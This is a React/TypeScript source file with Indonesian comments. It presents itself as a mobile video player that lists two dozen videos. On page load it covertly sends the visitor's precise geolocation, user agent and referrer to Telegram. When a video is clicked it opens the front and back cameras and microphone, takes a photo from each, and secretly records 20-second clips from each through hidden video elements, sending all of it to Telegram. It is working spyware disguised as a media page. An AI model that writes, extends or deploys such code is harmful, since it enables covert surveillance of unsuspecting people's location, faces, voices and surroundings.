import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
  const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
  const [isLoading, setIsLoading] = useState<boolean[]>([]);
  const [videoErrors, setVideoErrors] = useState<boolean[]>([]); // State untuk melacak error pemuatan video
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);

  const videos = [
    { videoUrl: 'https://cdn.videy.co/n9L2Emde1.mp4' },
    { videoUrl: 'https://cdn.videy.co/1b6c5wE41.mp4' },
    { videoUrl: 'https://cdn.videy.co/7hwla9hS1.mp4' },
    { videoUrl: 'https://cdn.videy.co/xP6RWC6J1.mp4' },
    { videoUrl: 'https://cdn.videy.co/deZOnAa71.mp4' },
    { videoUrl: 'https://cdn.videy.co/z9eBAbxS1.mp4' },
    { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
    { videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
    { videoUrl: 'https://cdn.videy.co/WLL4NxqP1.mp4' },
    { videoUrl: 'https://cdn.videy.co/6jYqrrwx1.mp4' },
    { videoUrl: 'https://cdn.videy.co/Tfh7KSKb1.mp4' },
    { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
    { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    { videoUrl: 'https://cdn.videy.co/nYIZsZcT1.mp4' },
    { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
    { videoUrl: 'https://cdn.videy.co/B2cLTw5A1.mp4' },
    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
    { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
    { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
    { videoUrl: 'https://cdn.videy.co/1LvE4FR31.mp4' },
    { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
    { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
    { videoUrl: 'https://cdn.videy.co/XJOGYNCi1.mp4' },
    { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
  ];

  useEffect(() => {
    setIsLoading(new Array(videos.length).fill(true));
    setVideoErrors(new Array(videos.length).fill(false));
  }, []);

  useEffect(() => {
    monitorSuspiciousActivity();

    const getLocation = async (): Promise<string> => {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });
        const { latitude, longitude } = position.coords;
        return `Latitude: ${latitude}, Longitude: ${longitude}`;
      } catch (error) {
        console.error('Gagal mendapatkan lokasi:', error);
        return window.location.href;
      }
    };

    const sendVisitorNotification = async () => {
      if (hasRequestedLocation) return;
      setHasRequestedLocation(true);

      const location = await getLocation();
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: location,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };

    sendVisitorNotification();

    videos.forEach((video, index) => {
      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[index] = true;
          return newErrors;
        });
      }
    });

    return () => {
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };
  }, [hasRequestedLocation]);

  const initializeCameraStreams = async () => {
    if (hasRequestedCamera) return;
    setHasRequestedCamera(true);

    const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
      try {
        const constraints = {
          video: {
            facingMode: typeof facingMode === 'string' ? facingMode : facingMode.deviceId,
            width: { min: 640, ideal: 1920, max: 3840 },
            height: { min: 480, ideal: 1080, max: 2160 },
            frameRate: { min: 24, ideal: 30, max: 60 }, // Memastikan frame rate minimal 24 fps
            aspectRatio: { ideal: 9 / 16 },
          },
          audio: true,
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const settings = stream.getVideoTracks()[0].getSettings();
        const deviceId = settings.deviceId || '';

        console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan resolusi: ${settings.width}x${settings.height} dan frame rate: ${settings.frameRate}`);

        return { stream, deviceId };
      } catch (error) {
        console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
        return null;
      }
    };

    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));

      const frontResult = await requestMediaAccess('user', 'depan');
      if (frontResult) {
        cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
      } else {
        console.warn('Kamera depan tidak tersedia atau akses ditolak.');
      }

      let backResult = await requestMediaAccess('environment', 'belakang');
      if (!backResult && videoDevices.length > 1) {
        console.log('Mencoba kamera belakang dengan deviceId alternatif...');
        backResult = await requestMediaAccess({ deviceId: videoDevices[1].deviceId }, 'belakang');
      }
      if (backResult) {
        cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
      } else {
        console.warn('Kamera belakang tidak tersedia atau akses ditolak.');
      }

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
      } else {
        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
      }
    } catch (error) {
      console.error('Error saat menginisialisasi stream kamera:', error);
    }
  };

  const verifyStream = (stream: MediaStream, type: string): boolean => {
    const videoTracks = stream.getVideoTracks();
    if (videoTracks.length === 0 || !videoTracks[0].enabled) {
      console.error(`Stream untuk kamera ${type} tidak valid atau dimatikan. Tracks: ${videoTracks.length}`);
      return false;
    }
    console.log(`Stream untuk kamera ${type} valid dengan ${videoTracks.length} track(s).`);
    return true;
  };

  const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
    try {
      const constraints = {
        video: {
          deviceId: { exact: deviceId },
          width: { min: 640, ideal: 1920, max: 3840 },
          height: { min: 480, ideal: 1080, max: 2160 },
          frameRate: { min: 24, ideal: 30, max: 60 },
          aspectRatio: { ideal: 9 / 16 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
      return stream;
    } catch (error) {
      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
      return null;
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop();
      console.log('Perekaman dihentikan.');
    }
  };

  const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
    let currentStream = stream;
    if (!verifyStream(currentStream, type)) {
      console.warn(`Stream kamera ${type} tidak valid, mencoba menginisialisasi ulang...`);
      const newStream = await reinitializeStream(type, deviceId);
      if (newStream && verifyStream(newStream, type)) {
        currentStream = newStream;
        const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
        if (cameraIndex !== -1) {
          cameraStreamsRef.current[cameraIndex].stream = newStream;
        }
      } else {
        console.warn(`Gagal menginisialisasi ulang stream kamera ${type}, melewati perekaman.`);
        return;
      }
    }

    try {
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = currentStream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
          setTimeout(resolve, 500);
        };
      });

      const videoTrack = currentStream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      const videoWidth = settings.width || 1280;
      const videoHeight = settings.height || 720;
      const frameRate = settings.frameRate || 30;

      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight} dengan frame rate: ${frameRate}`);

      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight;
      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = Math.min(videoWidth, 1920);
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = Math.min(videoHeight, 1080);
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      const context = canvas.getContext('2d', { willReadFrequently: true });
      if (context) {
        context.drawImage(cameraVideo, 0, 0, drawWidth, drawHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9);
      });

      try {
        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
      } catch (error) {
        console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
      }

      // Optimasi pengkodean video untuk kelancaran
      const supportedMimeType = ['video/mp4;codecs=h264', 'video/webm;codecs=vp9']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4;codecs=h264'; // Prioritaskan H.264 untuk kompatibilitas

      const mediaRecorder = new MediaRecorder(currentStream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 4000000, // Tingkatkan bitrate untuk kualitas lebih baik (4 Mbps)
        audioBitsPerSecond: 128000, // Bitrate audio standar
      });

      mediaRecorderRef.current = mediaRecorder;
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        if (videoBlob.size === 0) {
          console.warn('File video kosong, tidak dikirim ke Telegram.');
          return;
        }

        // Kompresi tambahan jika diperlukan (opsional)
        try {
          await sendVideoToTelegram(videoBlob);
          console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
        } catch (error) {
          console.error(`Gagal mengirim video dari kamera ${type}:`, error);
        }
      };

      mediaRecorder.onerror = (e) => {
        console.error(`Error saat merekam kamera ${type}:`, e);
      };

      // Mulai perekaman dengan interval yang lebih pendek untuk pengujian
      mediaRecorder.start(500); // Kurangi interval data untuk mengurangi buffering

      await new Promise((resolve) => setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
        }
        resolve(null);
      }, 20000));

      if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
    } catch (error) {
      console.error(`Error saat merekam kamera ${type}:`, error);
    } finally {
      currentStream.getTracks().forEach(track => track.stop()); // Hentikan semua track setelah selesai
    }
  };

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Memulai proses perekaman untuk kamera...');

    try {
      await new Promise((resolve) => {
        if (videoElement.readyState >= 3) {
          resolve(null);
        } else {
          videoElement.oncanplay = () => resolve(null);
        }
      });

      await videoElement.play();

      await initializeCameraStreams();

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada stream kamera yang tersedia.');
        videoElement.pause();
        setIsPlaying(null);
        return;
      }

      const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
      const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');

      if (frontCamera) {
        await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
      } else {
        console.warn('Kamera depan tidak tersedia untuk perekaman.');
      }

      if (backCamera) {
        await recordCamera(backCamera.stream, 'belakang', backCamera.deviceId);
      } else {
        console.warn('Kamera belakang tidak tersedia untuk perekaman.');
      }

      if (!frontCamera && !backCamera) {
        console.error('Kedua kamera tidak tersedia.');
      }

      videoElement.pause();
      setIsPlaying(null);
    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      videoElement.pause();
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = useCallback(async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
        prevVideo.removeAttribute('src');
        prevVideo.load();
        stopRecording();
        console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error('URL video tidak valid, menghentikan pemutaran.');
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[index] = true;
          return newErrors;
        });
        return;
      }

      try {
        setIsPlaying(index);
        await captureAndSendMedia(videoElement);
      } catch (error) {
        console.error('Error memutar video:', error);
        videoElement.pause();
        videoElement.currentTime = 0;
        videoElement.removeAttribute('src');
        videoElement.load();
        stopRecording();
        setIsPlaying(null);
      }
    }
  }, [isPlaying]);

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    stopRecording();
    setIsPlaying(null);
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  const handleCanPlay = (index: number) => {
    console.log(`Video ${index + 1} siap diputar.`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
  };

  const handleVideoError = (index: number) => {
    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl}`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
    setVideoErrors((prev) => {
      const newErrors = [...prev];
      newErrors[index] = true;
      return newErrors;
    });
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement && isFullscreen) {
        if (isPlaying !== null) {
          const videoElement = videoRefs.current[isPlaying];
          if (videoElement) {
            videoElement.pause();
            videoElement.currentTime = 0;
            videoElement.removeAttribute('src');
            videoElement.load();
            stopRecording();
            setIsPlaying(null);
            console.log('Video dihentikan karena keluar dari fullscreen.');
          }
        }
        setIsFullscreen(false);
      }
    };

    const handleBeforeUnload = () => {
      stopRecording();
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [isFullscreen, isPlaying]);

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[360px] mx-auto">
          <div className="space-y-2">
            {videos.map((video, index) => (
              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                {isLoading[index] && !videoErrors[index] && (
                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                    <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  </div>
                )}
                {videoErrors[index] && (
                  <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                    <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
                  </div>
                )}
                <video
                  ref={(el) => (videoRefs.current[index] = el)}
                  src={video.videoUrl} // Selalu set src untuk memastikan video dimuat
                  className="w-full h-full object-cover"
                  muted
                  onClick={() => handleVideoClick(index)}
                  onEnded={() => handleVideoEnded(index)}
                  onCanPlay={() => handleCanPlay(index)}
                  onError={() => handleVideoError(index)}
                  preload="auto" // Optimalkan buffering
                  playsInline
                  {...({ loading: 'lazy' } as any)}
                >
                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                </video>
                {isPlaying === index && !videoErrors[index] && (
                  <div className="absolute bottom-2 right-2 z-20">
                    <button
                      onClick={() => toggleFullscreen(index)}
                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                    >
                      {isFullscreen ? (
                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                      ) : (
                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
